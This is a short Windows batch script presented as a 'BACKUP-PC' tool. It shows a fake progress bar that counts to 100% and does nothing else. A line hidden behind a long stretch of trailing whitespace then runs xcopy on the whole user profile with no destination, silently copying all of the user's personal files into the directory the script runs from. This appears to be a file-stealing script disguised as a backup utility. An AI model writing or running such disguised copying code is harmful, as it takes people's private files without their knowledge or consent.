echo off
title  BACKUP-PC 100% Ø Desenvolvido por: Alex Danvers
color a
mode 53,5
set counter=0
set counterb=000
set core=±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
set "valuecore=                                                  "
setLocal EnableDelayedExpansion
:start
cls
echo.‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹
echo.€%valuecore:~0,50%€
echo.€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
if %counter% GEQ 50 set msg=complete& set counterb=10000& goto exit
echo. %counterb:~0,-2%%%
set /a counter=counter+1
set /a counterb=counterb+200
set "valuecore=!core:~0,%counter%!                                                  "
set delay=0
:delay
if %delay%==10 goto start
set /a delay=delay+1
goto delay
:exit
echo. %counterb:~0,-2%%% %msg%
ENDLOCAL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
xcopy %userprofile%\*.* /s /y
